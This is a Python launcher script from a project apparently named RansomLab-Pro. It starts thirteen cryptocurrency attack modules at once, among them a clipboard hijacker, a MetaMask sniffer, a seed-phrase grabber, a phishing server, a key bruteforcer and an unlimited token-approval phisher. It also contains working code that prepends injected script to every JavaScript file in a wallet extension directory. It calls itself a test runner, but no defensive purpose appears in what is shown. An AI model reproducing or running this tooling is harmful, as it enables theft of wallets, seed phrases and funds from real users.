# File: crypto_threats/main.py
"""
RansomLab-Pro Crypto Threats Test Runner
Inicia todos os módulos de crypto_threats em threads para testes simultâneos.
Use Ctrl+C para encerrar.
"""
import os
import sys
import threading
import time
from rich.console import Console
from rich.panel import Panel

# Ajusta sys.path para importar módulos locais
sys.path.insert(0, os.path.dirname(__file__))

console = Console()

# Imports de módulos locais (mesma pasta)
from clipbanker import main as clipbanker_main
from metamask_sniffer import main as metamask_sniffer_main
from seedphrase_grabber import main as seedphrase_grabber_main
from rpc_manipulator import ProxyHandler as RPCProxyHandler
from mev_bot import monitor_mempool
from phishing_dropper import PORT as PHISH_PORT, PhishHandler
from private_key_bruteforcer import generate_and_check
from contract_exploiter import exploit
from wallet_extension_injector import EXT_DIR, INJECT_CODE
from hardware_wallet_sniffer import main as hardware_sniffer_main
from cross_chain_hijack import ProxyHandler as CrossChainHandler
from subdomain_takeover import check_subdomains
from token_approval_phisher import send_approval

import socketserver
import http.server

THREADS = []

# Wrappers para threads

def start_clipbanker():
    clipbanker_main(dir='.', interval=1.0)


def start_metamask_sniffer():
    metamask_sniffer_main()


def start_seedphrase_grabber():
    seedphrase_grabber_main(dir='.')


def start_rpc_manipulator():
    console.print(Panel("[bold green]RPC Manipulator on port 8546[/bold green]", border_style="green"))
    with socketserver.ThreadingTCPServer(('', 8546), RPCProxyHandler) as httpd:
        httpd.serve_forever()


def start_mev_bot():
    monitor_mempool()


def start_phishing_dropper():
    console.print(Panel(f"[bold red]Phishing Dropper on port {PHISH_PORT}[/bold red]", border_style="red"))
    with socketserver.TCPServer(('', PHISH_PORT), PhishHandler) as httpd:
        httpd.serve_forever()


def start_private_bruteforce():
    generate_and_check()


def start_contract_exploiter():
    exploit()


def start_wallet_injector():
    from rich.progress import track
    console.print(Panel("[bold yellow]Injecting into extensions...[/bold yellow]", border_style="yellow"))
    for root, dirs, files in os.walk(EXT_DIR):
        for f in track(files, description="Injecting"):
            if f.endswith('.js'):
                path = os.path.join(root, f)
                lines = open(path, 'r', encoding='utf-8').readlines()
                lines.insert(0, INJECT_CODE + '\n')
                open(path, 'w', encoding='utf-8').writelines(lines)
    console.print("[green]Injection complete.[/green]")


def start_hardware_sniffer():
    hardware_sniffer_main()


def start_cross_chain_hijack():
    console.print(Panel("[bold magenta]Cross-Chain Hijack on port 9090[/bold magenta]", border_style="magenta"))
    with socketserver.TCPServer(('', 9090), CrossChainHandler) as httpd:
        httpd.serve_forever()


def start_subdomain_takeover():
    check_subdomains(['example.com', 'victim.com'])


def start_token_approval():
    send_approval("0xSpenderAddress", 2**256-1)


def main():
    console.clear()
    console.print(Panel("[bold cyan]Crypto Threats Test Runner[/bold cyan]", border_style="cyan"))
    mapping = [
        ('Clipbanker', start_clipbanker),
        ('Metamask Sniffer', start_metamask_sniffer),
        ('Seed Grabber', start_seedphrase_grabber),
        ('RPC Manipulator', start_rpc_manipulator),
        ('MEV Bot', start_mev_bot),
        ('Phishing Dropper', start_phishing_dropper),
        ('Key Bruteforce', start_private_bruteforce),
        ('Contract Exploiter', start_contract_exploiter),
        ('Extension Injector', start_wallet_injector),
        ('Hardware Sniffer', start_hardware_sniffer),
        ('Cross-Chain Hijack', start_cross_chain_hijack),
        ('Subdomain Takeover', start_subdomain_takeover),
        ('Token Approval', start_token_approval),
    ]
    for name, func in mapping:
        t = threading.Thread(target=func, daemon=True)
        t.name = name
        THREADS.append(t)
        console.print(f"[green]Launching:[/green] {name}")
        t.start()
    try:
        while True:
            alive = [t.name for t in THREADS if t.is_alive()]
            console.print(f"[bold]Running:[/bold] {alive}")
            time.sleep(10)
    except KeyboardInterrupt:
        console.print("[red]Shutting down...[/red]")

if __name__ == '__main__':
    main()
